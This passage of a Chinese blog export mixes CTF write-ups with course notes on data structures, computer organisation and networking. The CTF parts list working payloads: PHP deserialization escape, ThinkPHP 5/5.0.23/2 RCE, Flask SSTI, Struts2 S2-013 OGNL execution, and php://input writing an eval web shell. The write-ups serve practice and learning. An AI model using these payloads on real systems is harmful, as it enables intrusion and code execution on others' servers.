class="comment">//所以我们的思路便是使得$photo的值为config.php    </span></span><br></pre></td></tr></table></figure>

<p>通过审计代码发现</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$user</span>-&gt;<span class="title function_ invoke__">update_profile</span>(<span class="variable">$username</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$profile</span>));</span><br><span class="line"><span class="comment">//反序列化写入数据库，然后反序化读出数据库的参数，</span></span><br><span class="line"><span class="variable">$profile</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$profile</span>);</span><br><span class="line"><span class="variable">$photo</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>]));</span><br></pre></td></tr></table></figure>

<p>并且发现当写入数据库时，进行了替换，这让就会导致反序列化字符串逃逸</p>
<p>这里使用$nickname的变量覆盖$phpto,由于nickname的长度不能大于10</p>
<p>所以可以使用数组绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">Array</span>()) = <span class="literal">null</span></span><br><span class="line"><span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">Array</span>()) = <span class="literal">null</span></span><br><span class="line"><span class="title function_ invoke__">ereg</span>(pattern,<span class="title function_ invoke__">Array</span>()) =<span class="literal">null</span></span><br><span class="line"><span class="title function_ invoke__">preg_match</span>(pattern,<span class="title function_ invoke__">Array</span>()) = <span class="literal">false</span></span><br><span class="line"><span class="title function_ invoke__">strcmp</span>(<span class="title function_ invoke__">Array</span>(), “abc”) =<span class="literal">null</span></span><br><span class="line"><span class="title function_ invoke__">strpos</span>(<span class="title function_ invoke__">Array</span>(),“abc”) = <span class="literal">null</span></span><br><span class="line"><span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">Array</span>()) = <span class="literal">null</span></span><br></pre></td></tr></table></figure>

<p>下面是测试样例</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="keyword">array</span>(<span class="string">&quot;zhou&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$profile</span>);</span><br><span class="line"><span class="comment">//a:1:&#123;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:4:&quot;zhou&quot;;&#125;&#125;</span></span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="string">&quot;zhou&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$profile</span>);</span><br><span class="line"><span class="comment">//a:1:&#123;s:8:&quot;nickname&quot;;s:4:&quot;zhou&quot;;&#125;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$profile</span>);</span><br><span class="line"><span class="comment">//a:1:&#123;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span></span><br><span class="line"><span class="comment">//&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;长度为34,</span></span><br></pre></td></tr></table></figure>

<p>我们输入34个where则足够填充这些字符达到逃逸的目的</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>然后返回主页面，在主页面下载图片即可</p>
]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>buu-real1</title>
    <url>/2023/06/19/buu%E5%90%88%E9%9B%86-buu-real1/</url>
    <content><![CDATA[<p>buu real尽力写</p>
<span id="more"></span>

<h2 id="ThinkPHP-5-Rce"><a href="#ThinkPHP-5-Rce" class="headerlink" title="[ThinkPHP]5-Rce"></a>[ThinkPHP]5-Rce</h2><p>payload:</p>
<p><code>[ V5.0 版本由 [七牛云](http://www.qiniu.com/) 独家赞助发布 ]</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://node4.buuoj.cn:28434/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls</span><br></pre></td></tr></table></figure>

<h2 id="Flask-SSTI"><a href="#Flask-SSTI" class="headerlink" title="[Flask]SSTI"></a>[Flask]SSTI</h2><p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;%27%27.__class__.__bases__[0].__subclasses__()[166].__init__.__globals__.__builtins__[%27eval%27](%22__import__(%27os%27).popen(%27env%27).read()%22)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>flag在环境变量里</p>
<h2 id="ThinkPHP-5-0-23-Rce"><a href="#ThinkPHP-5-0-23-Rce" class="headerlink" title="[ThinkPHP]5.0.23-Rce"></a>[ThinkPHP]5.0.23-Rce</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /index.php?s=captcha HTTP/1.1</span><br></pre></td></tr></table></figure>

<p>post如下，由于flag在环境变量里</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=env</span><br></pre></td></tr></table></figure>

<h2 id="ThinkPHP-2-Rce"><a href="#ThinkPHP-2-Rce" class="headerlink" title="[ThinkPHP]2-Rce"></a>[ThinkPHP]2-Rce</h2><p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?s=/index/index/name/$&#123;@phpinfo()&#125;</span><br></pre></td></tr></table></figure>

<p>搜索flag</p>
<p>或者</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://node4.buuoj.cn:28261/?s=/index/index/name/$&#123;@eval($_POST[1])&#125;</span><br></pre></td></tr></table></figure>

<p>直接蚁剑连接，</p>
<h2 id="struts2-s2-013"><a href="#struts2-s2-013" class="headerlink" title="[struts2]s2-013"></a>[struts2]s2-013</h2><p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/link.action?a=%24%7b(%23_memberAccess%5b%22allowStaticMethodAccess%22%5d%3dtrue%2c%23a%3d%40java.lang.Runtime%40getRuntime().exec(%27env%27).getInputStream()%2c%23b%3dnew+java.io.InputStreamReader(%23a)%2c%23c%3dnew+java.io.BufferedReader(%23b)%2c%23d%3dnew+char%5b50000%5d%2c%23c.read(%23d)%2c%23out%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23out.println(%23d)%2c%23out.close())%7d</span><br></pre></td></tr></table></figure>



<h2 id="Jupyter-notebook-rce"><a href="#Jupyter-notebook-rce" class="headerlink" title="[Jupyter]notebook-rce"></a>[Jupyter]notebook-rce</h2><p>打开界面</p>
<p><img src="/2023/06/19/buu%E5%90%88%E9%9B%86-buu-real1/QQ%E6%88%AA%E5%9B%BE20230619221929.png"></p>
<p>新建一个终端，直接env</p>
<p>或者echo $FLAG</p>
]]></content>
      <categories>
        <category>buu</category>
      </categories>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>java网络编程</title>
    <url>/2023/09/29/%E4%B8%93%E4%B8%9A%E8%AF%BE-java%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/</url>
    <content><![CDATA[ <img src="https://s3.bmp.ovh/imgs/2023/09/29/163eab6771927f3a.png" style="zoom: 25%;">

<span id="more"></span>







]]></content>
  </entry>
  <entry>
    <title>数据结构</title>
    <url>/2023/09/28/%E4%B8%93%E4%B8%9A%E8%AF%BE-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<p><img src="https://s3.bmp.ovh/imgs/2023/09/29/163eab6771927f3a.png"></p>
<span id="more"></span>

<h1 id="第一章-绪论"><a href="#第一章-绪论" class="headerlink" title="第一章 绪论"></a>第一章 绪论</h1><ol>
<li><p>数据结构</p>
</li>
<li><p>数据结构的四个基本逻辑结构</p>
</li>
<li><p>数据结构的物理结构</p>
</li>
<li><p>数据类型</p>
</li>
<li><p>线性结构与非线性结构的差别</p>
</li>
<li><p>抽象数据类型</p>
</li>
<li><p>数据结构的形式化定义，数据结构的两个构成要素的含义</p>
</li>
<li><p>算法的特性以及算法设计要求</p>
</li>
<li><p>算法的时间复杂程度</p>
</li>
<li><p>函数参数传递的主要方式</p>
</li>
</ol>
<h1 id="第二章-线性表"><a href="#第二章-线性表" class="headerlink" title="第二章 线性表"></a>第二章 线性表</h1><p>本题要求实现一个函数，将给定的单链表逆转。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> ElementType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">PtrToNode</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">    ElementType Data;</span><br><span class="line">    PtrToNode   Next;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> PtrToNode List;</span><br><span class="line"></span><br><span class="line">List <span class="title function_">Read</span><span class="params">()</span>; <span class="comment">/* 细节在此不表 */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Print</span><span class="params">( List L )</span>; <span class="comment">/* 细节在此不表 */</span></span><br><span class="line"></span><br><span class="line">List <span class="title function_">Reverse</span><span class="params">( List L )</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    List L1, L2;</span><br><span class="line">    L1 = Read();</span><br><span class="line">    L2 = Reverse(L1);</span><br><span class="line">    Print(L1);</span><br><span class="line">    Print(L2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 你的代码将被嵌在这里 */</span></span><br><span class="line">List <span class="title function_">Reverse</span><span class="params">(List head)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(head == <span class="literal">NULL</span> || head-&gt;Next == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> head; </span><br><span class="line">    &#125;</span><br><span class="line">    List p;</span><br><span class="line">    List pcur;</span><br><span class="line">    List r;</span><br><span class="line">    p = head;</span><br><span class="line">    pcur = head-&gt;Next;</span><br><span class="line">    head-&gt;Next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span>(pcur)</span><br><span class="line">    &#123;</span><br><span class="line">        r = pcur-&gt;Next;</span><br><span class="line">        pcur-&gt;Next = p;</span><br><span class="line">        p = pcur;</span><br><span class="line">        pcur = r;</span><br><span class="line">    &#125;</span><br><span class="line">    head=p;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<p>二叉树的三种遍历</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">回顾一下二叉树的三种遍历</span><br><span class="line">先序： 根-&gt;左-&gt;右</span><br><span class="line">中序：左-&gt;根-&gt;右</span><br><span class="line">后序：左-&gt;右-&gt;根</span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/28/%E4%B8%93%E4%B8%9A%E8%AF%BE-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/09/28/%E4%B8%93%E4%B8%9A%E8%AF%BE-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/QQ%E6%88%AA%E5%9B%BE20231012170335.png"></p>
<p>先序遍历序列为A-B-D-E-G-C-F</p>
<p>中序遍历序列为：D-B-G-E-A-C-F</p>
<p>后续遍历序列为：D-G-E-B-F-C-A。</p>
<p>只要我们知道中序和先序或着后序 那么我们就可以根据已知的两种遍历序列<br>求出剩下的另一种遍历序列</p>
<p>平衡二叉树的定义是一种递归定义，</p>
<p>衡二叉树又叫AVL树</p>
<p>要求每个节点都具有以下特性：</p>
<ol>
<li>可以是一棵空树</li>
<li>左子树和右子树高度之差的绝对值不超过1（左右子树的高度差可以为0、1和 -1）</li>
<li>左子树和右子树均为平衡二叉树</li>
<li></li>
</ol>
<p><strong>证明:含有n个结点的二叉链表中含有n+1个空链域</strong></p>
<p>因为n个节点有2n个指针</p>
<p>又因为n个节点中有n-1条边（除了头结点没有边，其余节点都有一个父节点，相当于都有1条边，共n-1条）</p>
<p>剩下的空链域就是2n-(n-1)&#x3D;n+1，即n+1个空指针</p>
<p>若将一棵树 <em>T</em> 转化为对应的二叉树 <em>BT</em>，则下列对 <em>BT</em> 的遍历中，其遍历序列与 <em>T</em> 的后根遍历序列相同的是：中序遍历</p>
<p>所以完全二叉树如果没有左结点，则一定没有右结点，即没有左孩子，它就一定是树叶。</p>
]]></content>
  </entry>
  <entry>
    <title>计算机组成原理</title>
    <url>/2023/09/28/%E4%B8%93%E4%B8%9A%E8%AF%BE-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<p><img src="https://s3.bmp.ovh/imgs/2023/09/29/8005fc45e606f90e.png"></p>
<span id="more"></span>

<p>cache(高速缓冲<a href="https://so.csdn.net/so/search?q=%E5%AD%98%E5%82%A8%E5%99%A8&spm=1001.2101.3001.7020">存储器</a>)中的数据就是主存的一个子集，CPU访问存储器时会先访问cache，如果cache没有找到需要的数据，就会去主存找</p>
<p>Cache 的作用 :<strong>Cache的出现使得cpu可以不直接访问主存，而是和高速Cache 交换信息</strong></p>
<p>Cache 命中率</p>
<p><strong>cpu欲访问的信息已在Cache 中的比率</strong></p>
<p>将主存的储存空间分块，贮存和cache 之间以块为单位进行数据交换</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/10/17/43fbc4fad4d8c643.png"></p>
<p>Cache和主存的映射方式</p>
<p>全相联映射</p>
<p><strong>主存块可以放在Cache 的任意位置</strong></p>
<p>直接映射</p>
<p>每个主存块只能放到一个特定的位置</p>
<p>Cache块号&#x3D;主存块号%Cache总块数</p>
<p>组相联映射</p>
<p>Cache块分为若干组，每个主存块可放到特定分组的任意一个位置组好&#x3D;主存块号%分组数</p>
<p>![](C:\various files\blog\myblog\source_posts\专业课\计算机组成原理\QQ截图20231017182511.png)</p>
]]></content>
  </entry>
  <entry>
    <title>计算机网络</title>
    <url>/2023/06/10/%E4%B8%93%E4%B8%9A%E8%AF%BE-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/</url>
    <content><![CDATA[<p> 计算及网络内容有点多决定专门写篇博客，去整理一下</p>
 <span id="more"></span>



<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p><strong>互联网的基本特点</strong>：连通性和共享</p>
<p>世界上第一个计算机网络是<strong>ARPANET</strong></p>
<p>互联网服务提供者ISP，例如中国的联通，移动，电信。</p>
<h3 id="计算机网络的定义"><a href="#计算机网络的定义" class="headerlink" title="计算机网络的定义"></a>计算机网络的定义</h3><p>定义：计算机网络是将地理位置不同的独立计算机系统，通过传输介质链接起来，它们遵守共同的协议，</p>
<p>目的：通信和资源共享。</p>
<p>计算机网络（简称网络）有若干节点和连接这些节点的链路组成</p>
<p>通信系统三个基本要素：<strong>信源，通信媒体，信宿</strong>。</p>
<p>按照网络的作用范围进行分类，<strong>广域网WAN,城域网MAN，局域网LAN，个人区域网PAN</strong>。</p>
<p>计算机网络传输中常用的三种有限传播媒介是：<strong>双绞线，同轴电缆，光纤</strong>。</p>
<p>网络协议的主要要素为，<strong>语法，语义，同步</strong>。</p>
<p>网络中时延主要是由传播时延，发送时延，和排队时延组成。</p>
<h3 id="网络地址"><a href="#网络地址" class="headerlink" title="网络地址"></a>网络地址</h3><p>MAC地址：数据链路层使用, 也叫<strong>物理地址</strong>: 绑定在网卡上的一个地址(硬件地址)，MAC 地址是”绝对唯一”。</p>
<p>IP地址：在网络层，一个网络内部的IP地址，不应该重复。用于标识网络主机、其他网络设备（如路由器）的网络地址。</p>
<p>端口： 在网络通信中，IP地址用于标识主机网络地址，端口号可以标识主机中发送数据、接收数据的进程。简单说：端口号用于定位主机中的进程。</p>
<p>格式:<br> 端口号是0~65535范围的数字，在网络通信中，进程可以通过绑定一个端口号，来发送及接收网络数据。</p>
<p> 两个不同的进程，不能绑定同一个端口号，但一个进程可以绑定多个端口号。</p>
<p>MAC地址是数据链路层使用地址，而IP地址是网络层和以上各层使用的地址，是一种逻辑地址</p>
<table>
<thead>
<tr>
<th></th>
<th>网络协议</th>
<th align="center">物理设施</th>
<th>单位</th>
</tr>
</thead>
<tbody><tr>
<td>应用层</td>
<td>http,dns,FTP，SMTP,SNMP,POP3,TELENT</td>
<td align="center">网关</td>
<td>报文，消息</td>
</tr>
<tr>
<td>传输层</td>
<td>tcp,udp</td>
<td align="center"></td>
<td>报文，段</td>
</tr>
<tr>
<td>网络层</td>
<td>ip,ARP,ICMP,IGMP</td>
<td align="center">路由器</td>
<td>数据包</td>
</tr>
<tr>
<td>数据链路层</td>
<td>PPP,ethernet</td>
<td align="center">交换机网桥网卡</td>
<td>数据帧</td>
</tr>
<tr>
<td>物理层</td>
<td></td>
<td align="center">集线器，中继器，放大器</td>
<td>比特</td>
</tr>
</tbody></table>
<h2 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h2><p>数据通信系统可分为三大部分：<strong>源系统，传输系统，目的系统</strong></p>
<p>信道一般是用来表示向某一个方向传送的信息的媒体。</p>
<p>从通信双方信息交互方式来看，有三种基本方式，</p>
<p>单向通信，双向交替通信，双向同时通信。</p>
<p>传输媒体可分为两大类，引导性传输媒体（双绞线，同轴电缆，光纤），和非引导型传输媒体（无线，红外，大气激光）</p>
<p>常用的信道复分技术有：频分复用，时分复用，统计时分复用，码分复用，和波分复用。</p>
<p>光纤的优点是</p>
<ol>
<li>传输耗损小，中继时间长，对远距离传输，特变经济。</li>
<li>抗雷电和电磁干扰性能好。</li>
<li>无串音干扰，保密性好，也不容易被窃听或截取数据。</li>
<li>体积小，重量轻。</li>
</ol>
<h2 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h2><p> 数据链路层最基本的服务是将源计算机网络层来的数据可靠的传输到相邻节点的目标计算机的网络层。为达到这一目的，数据链路层必须具备一系列相应的功能，主要有：如何将数据组合成数据块（在数据链路层中将这种数据块称为帧，帧是数据链路层的传送单位）；如何控制帧在物理信道上的传输，包括如何处理传输差错，如何调节发送速率以使之与接收方相匹配；在两个网路实体之间提供数据链路通路的建立、维持和释放管理。</p>
<p>   数据链路层使用的信道主要有点对点信道和广播信道两种。</p>
<p>数据链路层的三个基本问题是：封装成帧，透明传输，和差错检测。</p>
<h3 id="PPP：点对点协议"><a href="#PPP：点对点协议" class="headerlink" title="PPP：点对点协议"></a>PPP：点对点协议</h3><p>简单；只检测差错，而不是纠错差错；不使用序号，也不进行流量控制；可同时支持多种网络层协议</p>
<p>适配器的的功能，包含了数据链路层以及物理层两个层次的功能。</p>
<p>Ethernet：以太网协议</p>
<p>以太网的硬件地址，即mac地址实际上就是适配器地址或适配器标识符 ，与主机所在的地址无关。源地址和目标地址都是48位长。</p>
<h2 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h2><p>网络层提供的两种服务：面向连接的虚电路服务，无连接的数据报服务</p>
<p>网络层不提供服务质量的承诺。</p>
<h3 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h3><p>地址解析协议ARP把IP地址解析为mac地址，它解决了同一个局域网上的主机或路由器的IP地址和MAC地址的映射问题。ARP的高速缓存可以大大减少网络上的通信量。</p>
<p>IP地址32位二进制代码，常用点分十进制记忆法。</p>
<h3 id="ICMP协议"><a href="#ICMP协议" class="headerlink" title="ICMP协议"></a>ICMP协议</h3><p>使用icmp并非为了实现可靠传输，ICMP允许主机或路由器报告差错情况和提供有关异常情况的报告。</p>
<p>ICMP报文的种类有两种，ICMP的差错报文和ICMP的询问报文。</p>
<p>ICMP的一个重要应用就是分组网间探测ping，用来测试两台主机之间的连通性。</p>
<h3 id="IPV6"><a href="#IPV6" class="headerlink" title="IPV6"></a>IPV6</h3><p>IPv6的目的地址可以是以下三种基本类型地址之一：<strong>单播，多播，和任播。</strong></p>
<p>IPv6所带来的变化，</p>
<ol>
<li>更大的地址空间（采用128位的地址）</li>
<li>灵活的首部格式</li>
<li>改进的选项</li>
<li>支持即插即用</li>
<li>支持资源的预分配</li>
<li>IPV6的首部改为八字节对齐</li>
</ol>
<p>IPv 6的地址采用冒号十六进制记法。</p>
<h2 id="运输层"><a href="#运输层" class="headerlink" title="运输层"></a>运输层</h2><p>运输层向它上面的应用层提供通信服务</p>
<p>与网络层的区别</p>
<p>网络层为主机之间的通信提供服务，而运输层则在网络层的基础上，为应用进程之间提供服务。</p>
<h3 id="UDP协议：用户数据报协议"><a href="#UDP协议：用户数据报协议" class="headerlink" title="UDP协议：用户数据报协议"></a><code>UDP</code>协议：用户数据报协议</h3><ol>
<li>无连接</li>
<li>尽最大努力交付</li>
<li>面向报文</li>
<li>无拥塞控制</li>
<li>支持一对一，一对多，多对一和多对多的交互通信</li>
<li>首部开销小（只有四个字段，源端口，目的端口，长度和校验和）</li>
</ol>
<h3 id="TCP：传输控制协议"><a href="#TCP：传输控制协议" class="headerlink" title="TCP：传输控制协议"></a><code>TCP</code>：传输控制协议</h3><p>三次握手四次挥手</p>
<ol>
<li>面向连接</li>
<li>每一条tcp连接只能是点对点的</li>
<li>提供可靠交付的服务</li>
<li>提供全双工通信</li>
<li>面向字节流</li>
</ol>
<h2 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h2><p>应用层提供应用进程间的逻辑通信</p>
<p><code>HTTP</code>：超文本传输协议<br><code>DNS</code>：域名解析协议<br>FTP：文件传送协议<br>SMTP：简单邮件传送协议<br>SNMP：简单网络管理协议<br>POP3：邮件读取协议<br>Telnet：远程终端协议</p>
]]></content>
      <tags>
        <tag>专业</tag>
      </tags>
  </entry>
  <entry>
    <title>crypto</title>
    <url>/2023/01/08/crypto/</url>
    <content><![CDATA[<p>​     tpye7加密</p>
<p>​    uuencode</p>
<p>​       <span id="more"></span></p>
<h1 id="tpye7解密"><a href="#tpye7解密" class="headerlink" title="tpye7解密"></a>tpye7解密</h1><p>ctfshow 菜狗杯 类型-7<br>094F5A0F0A0D1805103B0B3D143117183B720438350A45550967674D1E064F2969784440455A460F1A1B<br>tpye7 加密结果为16进制<br><a href="https://www.bejson.com/encrypt/type7_decode/">tpye7解密</a><br>ctfshow{Wow_u_Kn0w_Ci$c0_Type7_P@ssword!}</p>
<h1 id="Uuencode"><a href="#Uuencode" class="headerlink" title="Uuencode"></a>Uuencode</h1><p>buu crypto Unencode<br>密文：<br>89FQA9WMD&lt;V1A&lt;V1S83DY.#&lt;W3$Q,2TM]<br><a href="https://www.qqxiuzi.cn/bianma/uuencode.php">uuencode解密网站</a><br>flag{dsdasdsa99877LLLKK}</p>
<h1 id="hash"><a href="#hash" class="headerlink" title="hash"></a>hash</h1><p>buu Windows系统密码</p>
<p>a7fcb22a88038f35a8f39d503e7f0062</p>
<p><a href="https://www.cmd5.com/">md5在线解密破解,md5解密加密 (cmd5.com)</a></p>
<p>解密 good-luck</p>
<h1 id="中文电码"><a href="#中文电码" class="headerlink" title="中文电码"></a>中文电码</h1><p>buu 信息化时代的步伐</p>
<p>606046152623600817831216121621196386</p>
<p><a href="http://code.mcdvisa.com/">中文电码查询 Chinese Commercial Code - 标准电报码免费在线查询|姓名电码|美国签证电码 (mcdvisa.com)</a></p>
<p>解密：计算机要从娃娃抓起</p>
<h1 id="变异凯撒"><a href="#变异凯撒" class="headerlink" title="变异凯撒"></a>变异凯撒</h1><p>MTHJ{CUBCGXGUGXWREXIPOYAOEYFIGXWRXCHTKHFCOHCFDUCGTXZOHIXOEOWMEHZO}</p>
<p><a href="https://quipqiup.com/">quipqiup - cryptoquip and cryptogram solver</a></p>
<p>解码：flag substitution cipher decryption is always easy just like a piece of cake</p>
<p>去空格</p>
<h1 id="playfair解密"><a href="#playfair解密" class="headerlink" title="playfair解密"></a>playfair解密</h1><p>还能提示什么呢？公平的玩吧（密钥自己找） Dncnoqqfliqrpgeklwmppu 注意：得到的 flag 请包上 flag{} 提交, flag{小写字母}</p>
<p>提示公平的玩，playfair</p>
<p><a href="https://rumkin.com/tools/cipher/playfair/">Playfair (rumkin.com)</a></p>
<p>密钥playfair</p>
<p>flag{itisnotaproblemhavefun}</p>
]]></content>
      <categories>
        <category>crypto</category>
      </categories>
  </entry>
  <entry>
    <title>php伪协议</title>
    <url>/2023/01/09/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<p><code>php://input</code></p>
<p><code>data://text/plain</code>,xxxx</p>
<p><code>php://filter</code></p>
  <span id="more"></span>

<p>PHP常见的伪协议如下：</p>
<p>文件包含函数：</p>
<p>require<br>include<br>require_ once<br>include once</p>
<p>文件读取函数：</p>
<p>copy<br>file_get_contents()<br>highlight_file()<br>fopen()<br>read file()<br>fread()<br>fgetss()<br>fgets()<br>parse_ini_file()<br>show_source()<br>file()</p>
<table>
<thead>
<tr>
<th>file:&#x2F;&#x2F; 访问本地文件系统</th>
</tr>
</thead>
<tbody><tr>
<td>http:&#x2F;&#x2F; 访问HTTP(s)网址</td>
</tr>
<tr>
<td>ftp:&#x2F;&#x2F; 访问FTP(s)URLs</td>
</tr>
<tr>
<td>php:&#x2F;&#x2F; 访问各个输入&#x2F;输出流(I&#x2F;O streams)</td>
</tr>
<tr>
<td>zlib:&#x2F;&#x2F; 压缩流</td>
</tr>
<tr>
<td>data:&#x2F;&#x2F; 数据(RFC 2397)</td>
</tr>
<tr>
<td>glob:&#x2F;&#x2F; 查找匹配的文件路径模式</td>
</tr>
<tr>
<td>phar:&#x2F;&#x2F; PHP归档</td>
</tr>
<tr>
<td>ssh2:&#x2F;&#x2F; Secure Shell 2</td>
</tr>
<tr>
<td>rar:&#x2F;&#x2F; RAR</td>
</tr>
<tr>
<td>ogg:&#x2F;&#x2F; 音频流</td>
</tr>
<tr>
<td>expect:&#x2F;&#x2F; 处理交互式的流</td>
</tr>
</tbody></table>
<p>在这里详细说一下这个<code>php://filter</code></p>
<p>,这个是常用的伪协议，一般用于任意文件读取，有的时候也可以用在getshell，在双off的情况下也可以使用。</p>
<p>在这里举个例子</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>

<p>关于上面这个，解释一下，首先file关键字的get参数传递，php:&#x2F;&#x2F;是一种协议名称，php:&#x2F;&#x2F;filter&#x2F;是一种访问本地文件的协议，&#x2F;read&#x3D;convert.base64-encode&#x2F;表示读取的方式是base64编码后，resourse&#x3D;index.php表示目标文件为index.php。</p>
<p>上面举的常用的伪协议的用法：</p>
<p>1.php伪协议<br>用法：<br><code>php://input</code>,用于执行php代码，需要post请求提交数据。</p>
<p><strong>php:&#x2F;&#x2F;input</strong>可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php:&#x2F;&#x2F;input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。</p>
<p>需要开启allow_url_fopen:php:&#x2F;&#x2F;input、php:&#x2F;&#x2F;stdin、php:&#x2F;&#x2F;memory、php:&#x2F;&#x2F;temp<br>不需要开启allow_url_fopen:php:&#x2F;&#x2F;filter</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=php://input</span><br><span class="line">[POST DATA部分]</span><br><span class="line">&lt;?php fputs(fopen(&#x27;1.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;); ?&gt;</span><br></pre></td></tr></table></figure>

<p>2.、data协议</p>
<p>用法：<br><code>data://text/plain</code>,xxxx(要执行的php代码)<br><code>data://text/plain;base64</code>,xxxx(base64编码后的数据)<br>例：<br>?page&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<br>?page&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4&#x3D;</p>
